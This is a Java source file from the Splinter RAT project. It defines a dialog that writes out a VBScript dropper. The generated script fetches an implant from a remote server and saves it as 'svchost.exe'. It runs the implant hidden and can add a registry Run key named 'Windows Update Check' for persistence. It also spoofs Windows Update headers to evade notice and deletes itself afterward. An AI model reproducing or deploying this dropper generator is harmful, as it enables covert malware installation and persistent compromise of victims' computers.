/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Controller.GUI;

import Controller.Drivers.Drivers;
import Implant.Driver;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dialog.ModalityType;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JTextField;
import javax.swing.*;
import java.awt.*;

public class Dialog_DropperVBS extends JDialog
  implements ActionListener
{
  public static final String strMyClassName = "Dialog_DropperVBS";
  JPanel jpnlOptions = new JPanel(new GridLayout(24, 1));

  JPanel_Text_And_JTextField implantSavePath = new JPanel_Text_And_JTextField("Implant Save Path on Host:", "%USERPROFILE%\\Desktop");
  JPanel_Text_And_JTextField implantName = new JPanel_Text_And_JTextField("Implant Name on Host:", "svchost.exe");
  JPanel_Text_And_JTextField implantDownloadURL = new JPanel_Text_And_JTextField("Implant Download URL:", "http://192.168.0.100");
  JPanel_Text_And_JTextField implantDownloadNameOnServer = new JPanel_Text_And_JTextField("Implant Download Name on Server:", "update");
  JPanel_Text_And_JTextField implantExecutionArguments = new JPanel_Text_And_JTextField("Implant Execution Arguments:", "-i [URL to Controller] [Port]");

  JPanel_Text_And_JTextField implantDownloadParameters = new JPanel_Text_And_JTextField("Implant Download  Parameters:", "- - -");
  JPanel_Text_And_JTextField implantSaveParameters = new JPanel_Text_And_JTextField("Implant Save  Parameters:", "- - -");
  JPanel_Text_And_JTextField implantExecutionParameters = new JPanel_Text_And_JTextField("Implant Execution Parameters:", "- - -");
  JPanel_Text_And_JTextField registryArguments_Check = new JPanel_Text_And_JTextField("Registry Arguments:", "- - -");
  JPanel_Text_And_JTextField registryArguments_StringName = new JPanel_Text_And_JTextField("Registry String Name:", "Windows Update Check");

  JPanel_Text_And_JTextField header_Accept = new JPanel_Text_And_JTextField("[URL Header] \"Accept\" : ", "text/html, application/xhtml+xml, */*");
  JPanel_Text_And_JTextField header_Referer = new JPanel_Text_And_JTextField("[URL Header] \"Referer\" : ", "http://www.microsoft.com/");
  JPanel_Text_And_JTextField header_Accept_Language = new JPanel_Text_And_JTextField("[URL Header] \"Accept-Language\" : ", "en-US");
  JPanel_Text_And_JTextField header_User_Agent = new JPanel_Text_And_JTextField("[URL Header] \"User-Agent\" : ", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)");
  JPanel_Text_And_JTextField header_Accept_Encoding = new JPanel_Text_And_JTextField("[URL Header] \"Accept-Encoding\" : ", "gzip, deflate");
  JPanel_Text_And_JTextField header_Host = new JPanel_Text_And_JTextField("[URL Header] \"Host\" : ", "www.windowsupdate.com");
  JPanel_Text_And_JTextField header_DNT = new JPanel_Text_And_JTextField("[URL Header] \"DNT\" : ", "1");
  JPanel_Text_And_JTextField header_Connection = new JPanel_Text_And_JTextField("[URL Header] \"Connection\" : ", "Keep-Alive");
  JPanel_Text_And_JTextField header_Cookie = new JPanel_Text_And_JTextField("[URL Header] \"Cookie\" : ", System.currentTimeMillis() * 1000000L + "; " + System.currentTimeMillis() * 10000L);

  JCheckBox jcbPersistence = new JCheckBox("Establish Persistence");

  JCheckBox jcbDeleteDropper = new JCheckBox("Delete Dropper After Execution");

  JPanel jpnlMalwareExistsAtLocation = new JPanel();
  JLabel jlblMalwareExistsAtLocation = new JLabel("Action if Malware Exists at Location: ");
  JRadioButton jrbOverwrite = new JRadioButton("Overwrite (if possible)", false);
  JRadioButton jrbDeleteDropper = new JRadioButton("Delete Dropper (if possible)", false);
  JRadioButton jrbExitScript = new JRadioButton("Close Dropper Script (recommended)", true);
  ButtonGroup bgMalwareExists = new ButtonGroup();

  JCheckBox jcbSpoofHeader = new JCheckBox("Spoof Header");

  JPanel jpnlButtons = new JPanel();
  JButton jbtnCheck = new JButton("Check");
  JButton jbtnExport = new JButton("Export");
  JButton jbtnCancel = new JButton("Cancel");

  public Dialog_DropperVBS()
  {
    try
    {
      setTitle("Select Components");

      setLayout(new BorderLayout());
      setTitle("VBS Droper");
      setBounds(300, 100, 750, 700);
      setResizable(false);

      setModaling();
      Drivers.setJFrameIcon(this);

      add("Center", this.jpnlOptions);

      this.jpnlOptions.add(this.implantDownloadURL);
      this.jpnlOptions.add(this.implantDownloadNameOnServer);
      this.jpnlOptions.add(this.implantDownloadParameters);

      this.jpnlOptions.add(this.implantSavePath);
      this.jpnlOptions.add(this.implantName);
      this.jpnlOptions.add(this.implantExecutionArguments);

      this.jpnlOptions.add(this.implantSaveParameters);
      this.jpnlOptions.add(this.implantExecutionParameters);

      this.jpnlOptions.add(this.jcbPersistence);
      this.jpnlOptions.add(this.registryArguments_StringName);
      this.jpnlOptions.add(this.registryArguments_Check);

      this.jpnlMalwareExistsAtLocation.add(this.jlblMalwareExistsAtLocation);
      this.jpnlMalwareExistsAtLocation.add(this.jrbExitScript);
      this.jpnlMalwareExistsAtLocation.add(this.jrbDeleteDropper);

      this.bgMalwareExists.add(this.jrbExitScript);
      this.bgMalwareExists.add(this.jrbOverwrite);
      this.bgMalwareExists.add(this.jrbDeleteDropper);
      this.jpnlOptions.add(this.jpnlMalwareExistsAtLocation);

      this.jpnlOptions.add(this.jcbSpoofHeader);
      this.jpnlOptions.add(this.header_Accept);
      this.jpnlOptions.add(this.header_Referer);
      this.jpnlOptions.add(this.header_Accept_Language);
      this.jpnlOptions.add(this.header_User_Agent);
      this.jpnlOptions.add(this.header_Accept_Encoding);
      this.jpnlOptions.add(this.header_Host);
      this.jpnlOptions.add(this.header_DNT);
      this.jpnlOptions.add(this.header_Connection);
      this.jpnlOptions.add(this.header_Cookie);

      this.jpnlOptions.add(this.jcbDeleteDropper);

      this.jpnlButtons.add(this.jbtnCheck);
      this.jpnlButtons.add(this.jbtnExport);
      this.jpnlButtons.add(this.jbtnCancel);
      this.jpnlOptions.add(this.jpnlButtons);

      this.jbtnExport.addActionListener(this);
      this.jbtnCancel.addActionListener(this);
      this.jbtnCheck.addActionListener(this);
      this.jcbSpoofHeader.addActionListener(this);
      this.jcbPersistence.addActionListener(this);

      this.implantDownloadParameters.jtf.setEditable(false);
      this.implantExecutionParameters.jtf.setEditable(false);
      this.implantSaveParameters.jtf.setEditable(false);
      this.registryArguments_Check.jtf.setEditable(false);

      this.header_Accept.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.header_Referer.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.header_Accept_Language.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.header_User_Agent.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.header_Accept_Encoding.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.header_Host.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.header_DNT.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.header_Connection.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.header_Cookie.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      this.registryArguments_StringName.jtf.setEditable(this.jcbPersistence.isSelected());
    }
    catch (Exception e)
    {
      Driver.eop("Constructor", "Dialog_DropperVBS", e, "", false);
    }
  }

  public boolean setModaling()
  {
    try
    {
      setModal(true);
      setAlwaysOnTop(true);
      setModalityType(Dialog.ModalityType.APPLICATION_MODAL);

      return true;
    } catch (Exception ee) {
      Driver.sop("in Dialog_DropperVBS could not set modaling");
    }
    return false;
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.jbtnCheck)
      {
        validateForm();
      }
      else if (ae.getSource() == this.jbtnCancel)
      {
        dispose();
      }
      else if (ae.getSource() == this.jbtnExport)
      {
        if (validateForm())
        {
          exportScript();
        }
        else
        {
          Drivers.jop_Error("Invalid Input in Dropper Form", "Unable to Complete Selected Action");
        }

      }
      else if (ae.getSource() == this.jcbSpoofHeader)
      {
        this.header_Accept.jtf.setEditable(this.jcbSpoofHeader.isSelected());
        this.header_Referer.jtf.setEditable(this.jcbSpoofHeader.isSelected());
        this.header_Accept_Language.jtf.setEditable(this.jcbSpoofHeader.isSelected());
        this.header_User_Agent.jtf.setEditable(this.jcbSpoofHeader.isSelected());
        this.header_Accept_Encoding.jtf.setEditable(this.jcbSpoofHeader.isSelected());
        this.header_Host.jtf.setEditable(this.jcbSpoofHeader.isSelected());
        this.header_DNT.jtf.setEditable(this.jcbSpoofHeader.isSelected());
        this.header_Connection.jtf.setEditable(this.jcbSpoofHeader.isSelected());
        this.header_Cookie.jtf.setEditable(this.jcbSpoofHeader.isSelected());
      }
      else if (ae.getSource() == this.jcbPersistence)
      {
        this.registryArguments_StringName.jtf.setEditable(this.jcbPersistence.isSelected());
      }

    }
    catch (Exception e)
    {
      Driver.eop("AE", "Dialog_DropperVBS", e, "", false);
    }
  }

  public boolean exportScript()
  {
    try
    {
      File fleOut = Drivers.querySelectFile(false, "Please select location to save Dropper Script", 1, false, false);

      if (fleOut == null)
      {
        Drivers.jop_Error("Invalid Selection                                     ", "Unable to Complete Selected Action");
        return false;
      }

      File fleDropper = null;
      String dropperName = System.currentTimeMillis() + "_Dropper.vbs";

      if (fleOut.getCanonicalPath().endsWith(Driver.fileSeperator))
        fleDropper = new File(fleOut.getCanonicalPath() + dropperName);
      else {
        fleDropper = new File(fleOut.getCanonicalPath() + Driver.fileSeperator + dropperName);
      }

      PrintWriter pwOut = new PrintWriter(new BufferedOutputStream(new FileOutputStream(fleDropper)));

      pwOut.println("'Splinter - RAT vrs 1.41 - BETA VBS Dropper Script Created " + Driver.getTimeStamp_Updated() + "\n\n");
      pwOut.println("");

      pwOut.println("set tempShell = CreateObject(\"WScript.Shell\")");

      String outLocation = this.implantSavePath.getText();
      String savePath = "";

      if ((outLocation != null) && (outLocation.startsWith("%")))
      {
        String[] arr = outLocation.split("%");

        Drivers.sop("Note: only works for the first environment variable found for now");

        savePath = "tempShell.ExpandEnvironmentStrings(\"%" + arr[1] + "%\")" + " + \"" + arr[2];

        pwOut.println("malwareSavePath = " + savePath + "\\" + this.implantName.getText() + "\"");
      }
      else
      {
        pwOut.println("malwareSavePath = \"" + this.implantSaveParameters.getText().trim() + "\"");
      }

      pwOut.println("tempPath  = tempShell.ExpandEnvironmentStrings(\"%TEMP%\")");
      pwOut.println("appData  = tempShell.ExpandEnvironmentStrings(\"%LOCALAPPDATA%\")");
      pwOut.println("hotfix = tempShell.ExpandEnvironmentStrings(\"%windir%\") + \"\\softwaredistribution\\download\"");

      if (this.jcbPersistence.isSelected())
      {
        pwOut.println("");
        pwOut.println("");
        pwOut.println("\t'write to registry for persistence");

        pwOut.println("\tConst HKEY_LOCAL_MACHINE = &H80000002");
        pwOut.println("\tthisComputer = \".\" ");
        pwOut.println("\tSet objRegistry=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" & thisComputer & \"\\root\\default:StdRegProv\")");
        pwOut.println(" ");
        pwOut.println("\tstrKeyPath = \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"");
        pwOut.println("\tstrValueName = \"" + this.registryArguments_StringName.getText().trim() + "\"");
        pwOut.println("\tstrValue = \"\"\"" + this.implantSaveParameters.getText().trim() + "\"\"\"" + " + \" " + this.implantExecutionArguments.getText().trim() + "\"");
        pwOut.println("\tobjRegistry.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue");

        pwOut.println("");
      }

      pwOut.println("");

      if (this.jrbExitScript.isSelected())
      {
        pwOut.println("'first ensure file does not already exist");
        pwOut.println("Set objFSO = CreateObject(\"Scripting.FileSystemObject\")");
        pwOut.println("");
        pwOut.println("'Drop Binary at specified location");
        pwOut.println("");
        pwOut.println("\tIf objFSO.FileExists (malwareSavePath) Then");
        pwOut.println("\t\twscript.quit");
        pwOut.println("\tend if");
        pwOut.println("");
      }

      if (this.jrbDeleteDropper.isSelected())
      {
        pwOut.println("\t'first ensure file does not already exist");
        pwOut.println("\tSet objFSO = CreateObject(\"Scripting.FileSystemObject\")");
        pwOut.println("");
        pwOut.println("\tIf objFSO.FileExists (malwareSavePath) Then");
        pwOut.println("\t\t'Implant appears to exist at location, therefore delete the script and exit");
        pwOut.println("\t\tSet objSelf = CreateObject(\"Scripting.FileSystemObject\")");
        pwOut.println("\t\tstrSelf = Wscript.ScriptFullName");
        pwOut.println("\t\tobjSelf.DeleteFile(strSelf)");
        pwOut.println("\t\tWscript.Quit");
        pwOut.println("\tend if");
        pwOut.println("");
      }

      pwOut.println("");

      pwOut.println("'made it here, download and execute implant!");
      pwOut.println("Set shell = CreateObject(\"WScript.Shell\")");
      pwOut.println("");

      pwOut.println("'Save Settings");
      pwOut.println("\tstrFileURL = \"" + this.implantDownloadParameters.getText() + "\"");
      pwOut.println("\tstrHDLocation = malwareSavePath");

      pwOut.println("");
      pwOut.println("'Download File!");
      pwOut.println("\tSet objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")");
      pwOut.println("\tobjXMLHTTP.open \"GET\", strFileURL, false");

      if (this.jcbSpoofHeader.isSelected())
      {
        pwOut.println("");
        pwOut.println("'add some header data, this can potential fool the casual observer");
        pwOut.println(" objXMLHTTP.setRequestHeader \"Accept\", \"" + this.header_Accept.getText().trim() + "\"");
        pwOut.println(" objXMLHTTP.setRequestHeader \"Referer\", \"" + this.header_Referer.getText().trim() + "\"");
        pwOut.println(" objXMLHTTP.setRequestHeader \"Accept-Language\", \"" + this.header_Accept_Language.getText().trim() + "\"");
        pwOut.println(" objXMLHTTP.setRequestHeader \"User-Agent\", \"" + this.header_User_Agent.getText().trim() + "\"");
        pwOut.println(" objXMLHTTP.setRequestHeader \"Accept-Encoding\", \"" + this.header_Accept_Encoding.getText().trim() + "\"");
        pwOut.println(" objXMLHTTP.setRequestHeader \"Host\", \"" + this.header_Host.getText().trim() + "\"");
        pwOut.println(" objXMLHTTP.setRequestHeader \"DNT\", \"" + this.header_DNT.getText().trim() + "\"");
        pwOut.println(" objXMLHTTP.setRequestHeader \"Connection\", \"" + this.header_Connection.getText().trim() + "\"");
        pwOut.println(" objXMLHTTP.setRequestHeader \"Cookie\", \"" + this.header_Cookie.getText().trim() + "\"");
        pwOut.println("");
      }

      pwOut.println("");
      pwOut.println("\tobjXMLHTTP.send()");
      pwOut.println("");

      pwOut.println("If objXMLHTTP.Status = 200 Then");
      pwOut.println("\tSet objADOStream = CreateObject(\"ADODB.Stream\")");
      pwOut.println("\tobjADOStream.Open");
      pwOut.println("\tobjADOStream.Type = 1 'adTypeBinary");
      pwOut.println("\tobjADOStream.Write objXMLHTTP.ResponseBody");
      pwOut.println("\tobjADOStream.Position = 0");

      pwOut.println("\tSet objFSO = Createobject(\"Scripting.FileSystemObject\")");
      pwOut.println("\t\tIf objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation");
      pwOut.println("\tSet objFSO = Nothing");

      pwOut.println("\tobjADOStream.SaveToFile strHDLocation");
      pwOut.println("\tobjADOStream.Close");
      pwOut.println("\tSet objADOStream = Nothing");
      pwOut.println("End if");

      pwOut.println("\tSet objXMLHTTP = Nothing");

      pwOut.println("");
      pwOut.println("'execute malware if it exists now, use ,false parameter in shell.run to specify this script should not wait after invoking the command, so continue down here and close!");
      pwOut.println("Set searchForMalware = CreateObject(\"Scripting.FileSystemObject\")");
      pwOut.println(" If searchForMalware.FileExists (malwareSavePath) Then");
      pwOut.println("\tshell.Run \"\" + malwareSavePath + \" " + this.implantExecutionArguments.getText().trim() + "\"" + ", 0, false");
      pwOut.println(" end if");

      pwOut.println("");

      if (this.jcbDeleteDropper.isSelected())
      {
        pwOut.println("'deleting self now...");
        pwOut.println("Set objSelf = CreateObject(\"Scripting.FileSystemObject\")");
        pwOut.println("strSelf = Wscript.ScriptFullName");
        pwOut.println("objSelf.DeleteFile(strSelf)");
      }

      pwOut.println("");

      pwOut.println("Wscript.Quit");
      pwOut.println("\n\n'Source: http://serverfault.com/questions/29707/download-file-from-vbscript");

      pwOut.flush();
      pwOut.flush();
      pwOut.close();

      Drivers.jop("Export Successful\n Dropper Location: " + fleDropper.getCanonicalPath());

      Driver.sop("\n* * * Dropper Successfully written to " + fleDropper.getCanonicalPath());

      this.jbtnCancel.setText("Close");
      this.jbtnCancel.setBackground(Color.red);

      return true;
    }
    catch (Exception e)
    {
      Driver.sop("Errors found on Form.  Unable to continue...");

      dispose();
    }
    return false;
  }

  public boolean validateForm()
  {
    try
    {
      this.implantDownloadParameters.setText(this.implantDownloadURL.getText().trim() + "/" + this.implantDownloadNameOnServer.getText().trim());
      this.implantExecutionParameters.setText(this.implantName.getText().trim() + " " + this.implantExecutionArguments.getText().trim());
      this.implantSaveParameters.setText(this.implantSavePath.getText().trim() + "\\" + this.implantName.getText().trim());
      this.registryArguments_Check.setText("Value Name: " + this.registryArguments_StringName.getText().trim() + "  Type: REG_SZ  " + "Value Location: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" + "  Data: \"" + this.implantSaveParameters.getText().trim() + "\"" + this.implantExecutionArguments.getText().trim());
      return true;
    }
    catch (Exception e)
    {
      Driver.eop("validateForm", "Dialog_DropperVBS", e, "", false);
    }

    return false;
  }
}